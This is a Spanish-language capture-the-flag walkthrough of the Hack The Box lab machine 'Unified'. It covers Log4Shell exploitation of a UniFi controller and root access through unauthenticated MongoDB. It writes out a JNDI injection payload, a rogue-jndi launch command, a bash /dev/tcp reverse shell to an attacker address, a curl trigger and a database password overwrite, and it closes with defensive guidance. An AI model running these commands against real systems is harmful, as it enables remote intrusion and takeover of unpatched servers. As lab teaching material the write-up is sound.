---
title: Unified (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, log4shell, log4j, jndi, mongodb, rce, linux, tier-2]
type: nota
status: en-progreso
source: claude-code
aliases: [Unified HTB, HTB Unified, Log4Shell UniFi]
---

# Unified — HTB Starting Point (Tier 2)

**Tier 2 · SO: Linux · Dificultad: Very Easy · Skills: Log4Shell (CVE-2021-44228), JNDI injection, MongoDB post-explotacion, escalada via credenciales**

Una de las maquinas mas instructivas del Starting Point: demuestra Log4Shell en condiciones reales (aplicacion de red empresarial Ubiquiti UniFi), y luego muestra como la post-explotacion en una base de datos interna puede escalar hasta root sin exploits adicionales. > Este es un laboratorio legal y autorizado de Hack The Box; toda actividad se realiza sobre infraestructura propia de HTB.

---

## Objetivo

Obtener acceso a un sistema Linux explotando Log4Shell en la interfaz web de UniFi Network Controller, luego recuperar credenciales de root desde MongoDB interna.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoria: descubrimiento de superficie de ataque con nmap.**

```bash
nmap -sC -sV -p- --min-rate 5000 <IP>
```

Puertos relevantes que aparecen:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 8080   | HTTP     | Redirige a 8443 |
| 8443   | HTTPS    | UniFi Network Controller (interfaz web) |
| 6789   | TCP      | UniFi STUN/throughput test |
| 27117  | MongoDB  | Base de datos interna de UniFi (sin autenticacion) |

La version de UniFi que expone el puerto 8443 es 6.4.54, que esta dentro del rango vulnerable a Log4Shell.

---

## Enumeracion

**Categoria: fingerprinting de aplicacion web y confirmacion de version vulnerable.**

Al navegar a `https://<IP>:8443` aparece el login de UniFi Network Controller. La version se confirma en la pantalla de login o en las cabeceras HTTP.

Log4j (la libreria de logging de Java que usa UniFi internamente) procesa los campos de formulario al escribirlos en logs. El campo `remember` del endpoint de login **no sanitiza la entrada antes de pasarla al logger**, lo que permite inyectar una cadena JNDI que Log4j interpreta y ejecuta.

Para interceptar la peticion de login se usa Burp Suite (u otra herramienta de proxy HTTP):

```http
POST /api/login HTTP/1.1
Host: <IP>:8443
Content-Type: application/json

{
  "username": "cualquiera",
  "password": "cualquiera",
  "remember": "${jndi:ldap://TU_IP:1389/o=tomcat}",
  "strict": true
}
```

El campo `remember` es el vector; el valor inyectado es el payload JNDI que apunta a tu maquina atacante.

---

## Acceso inicial (foothold)

**Categoria: RCE via Log4Shell (CVE-2021-44228) + servidor LDAP malicioso.**

**Patron**: Log4j interpreta la cadena `${jndi:ldap://...}` en tiempo de log, hace una consulta LDAP saliente, descarga una clase Java del servidor atacante y la ejecuta en el contexto del proceso de UniFi.

### 1. Preparar el servidor LDAP/HTTP malicioso

Se usa `rogue-jndi` (herramienta Java que combina servidor LDAP + servidor HTTP en uno):

```bash
# Clonar y compilar (requiere Java y Maven)
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package -q

# Lanzar con el payload: reverse shell hacia TU_IP:puerto
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,<BASE64_PAYLOAD>}|{base64,-d}|bash" \
  --hostname "TU_IP"
```

El `<BASE64_PAYLOAD>` es el comando de reverse shell codificado en base64 para evitar problemas con caracteres especiales. Ejemplo del comando a codificar:

```bash
bash -i >& /dev/tcp/TU_IP/4444 0>&1
```

Codificar:

```bash
echo -n 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' | base64
```

> El comando exacto de rogue-jndi (flags, path JNDI) puede variar segun la version; ajustalo consultando el README del repositorio contra la maquina en vivo.

### 2. Escuchar la conexion inversa

```bash
nc -lvnp 4444
```

### 3. Disparar el payload

Enviar la peticion POST modificada (con el campo `remember` inyectado) a traves de Burp Repeater o curl:

```bash
curl -k -s -X POST https://<IP>:8443/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"x","password":"x","remember":"${jndi:ldap://TU_IP:1389/o=tomcat}","strict":true}'
```

Si todo esta en orden, recibes una shell como el usuario `unifi` (o similar) en el listener de netcat.

### 4. Estabilizar la shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg
```

---

## Escalada de privilegios

**Categoria: post-explotacion en MongoDB interno -> credencial de root en texto claro.**

UniFi almacena su configuracion (incluidos usuarios y contrasenas del panel) en una instancia MongoDB que escucha en `localhost:27117` **sin autenticacion**.

### 1. Conectarse a MongoDB

```bash
mongo --port 27117
```

### 2. Explorar la base de datos de UniFi y cambiar la contrasena del admin

```javascript
use ace
db.admin.find().pretty()
// Muestra los usuarios admin del panel UniFi y sus hashes bcrypt
```

Generar un nuevo hash bcrypt para una contrasena conocida:

```bash
# En la shell de la maquina victima
mkpasswd -m sha-512 NuevaContrasena123
# O bien usar Python:
python3 -c "import bcrypt; print(bcrypt.hashpw(b'NuevaContrasena123', bcrypt.gensalt()).decode())"
```

Actualizar el hash en Mongo:

```javascript
db.admin.update(
  { "name": "administrator" },
  { $set: { "x_shadow": "<HASH_GENERADO>" } }
)
```

> El nombre del campo puede ser `x_shadow` o `password` segun la version de UniFi; verificalo con `find().pretty()` antes de actualizar.

### 3. Entrar al panel web con la nueva contrasena

Navegar a `https://<IP>:8443` y autenticarse como `administrator` con la contrasena elegida.

### 4. Obtener la credencial root

Dentro del panel de UniFi, en **Settings > Site** o en la configuracion SSH del dispositivo, aparece la contrasena root del sistema en texto claro (UniFi la almacena para gestionar el dispositivo via SSH).

```bash
ssh root@<IP>
# Usar la contrasena obtenida del panel
```

---

## Flags

Esta maquina tiene **dos flags** (una de usuario y una de root):

| Flag | Ubicacion tipica | Como se obtiene |
|------|-----------------|----------------|
| `user.txt` | `/home/<usuario>/user.txt` | Con la shell inicial como `unifi` |
| `root.txt` | `/root/root.txt` | Con acceso SSH como root |

Ambas contienen un hash en formato `<flag>` que se introduce en la plataforma HTB para validar.

---

## Patron y teoria

### El patron: Log4Shell -> RCE -> post-explotacion en datos internos

```
Input usuario (campo de formulario)
  -> Logger de Java (Log4j) lo procesa sin sanitizar
    -> Log4j interpreta ${jndi:ldap://...}
      -> Peticion LDAP saliente hacia atacante
        -> Descarga y ejecuta clase Java arbitraria
          -> RCE en el proceso de la aplicacion
            -> Acceso a recursos internos (MongoDB sin auth)
              -> Credenciales admin/root en texto claro
```

Este encadenamiento es el arquetipo de **Log4Shell**: la vulnerabilidad no esta en la logica de negocio sino en la **libreria de logging** que interpreta datos de usuario como instrucciones. Afecto a cientos de productos empresariales en 2021 (VMware, Cisco, Ubiquiti, etc.).

### Por que es peligroso desde perspectiva de diseno

1. **Confiar en input externo dentro de una libreria de infraestructura**: Log4j tiene una feature de "message lookup" que permite interpolacion dinamica en los mensajes de log. Es una feature, no un bug, pero el diseno asume que los mensajes de log son internos — cuando no lo son.

2. **MongoDB sin autenticacion en localhost**: el supuesto de que "localhost es seguro" cae en cuanto hay RCE. Cualquier proceso comprometido hereda acceso total a la BD.

3. **Credenciales en texto claro en la BD**: UniFi almacena la contrasena SSH del dispositivo para gestionarlo. Una vez comprometida la BD, la escalada a root es trivial.

### Como se defiende / Como se disena para evitarlo (purple team / dev)

**Parchear Log4j (primario)**
- Actualizar a Log4j >= 2.17.1 (la serie 2.x) o >= 2.3.2 (rama 1.x legacy).
- En versiones vulnerables, mitigacion temporal: `-Dlog4j2.formatMsgNoLookups=true` como JVM flag, o eliminar la clase `JndiLookup` del classpath.

**Egress filtering (defensa en profundidad)**
- Bloquear conexiones LDAP/RMI **salientes** desde servidores de aplicacion. Si el servidor no puede conectarse al exterior por LDAP, el payload no puede completar el handshake con el servidor malicioso.
- Regla de firewall: permitir solo puertos de salida estrictamente necesarios (443, 25, 587...). LDAP (389/636) y RMI (1099) no deberan salir desde un servidor de aplicacion en produccion.

**WAF con firma Log4Shell**
- Detectar y bloquear patrones `${jndi:`, `${::-j}`, `${${lower:j}}` y variantes ofuscadas en campos HTTP.
- Utiles como capa adicional, pero **no suficientes solos** (hay decenas de bypasses de ofuscacion).

**No loggear input de usuario sin sanitizar**
- Regla de diseno: **nunca** pasar input externo directamente a un logger sin haberlo escapado o validado. Usar `Pattern.compile` o un esquema de allow-list antes de loggear.
- En Java moderno: preferir SLF4J con parametros posicionales (`log.info("User: {}", username)`) en lugar de interpolacion de strings, aunque esto no elimina Log4Shell por si solo.

**MongoDB: autenticacion siempre, incluso en localhost**
- Habilitar autenticacion en MongoDB (`--auth` flag o `security.authorization: enabled` en mongod.conf).
- Principio de minimo privilegio: el proceso de UniFi deberia tener un usuario de BD con permisos solo sobre su propia BD, no sobre `admin`.

**Secretos: no almacenar contrasenas en texto claro en BD**
- Las credenciales SSH de gestion de dispositivos deberian estar cifradas en reposo y gestionadas por un secrets manager (Vault, AWS Secrets Manager, etc.), no en un campo de texto en MongoDB.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[08-vulnerabilidades-y-explotacion]]
- [[09-devsecops-y-appsec]]
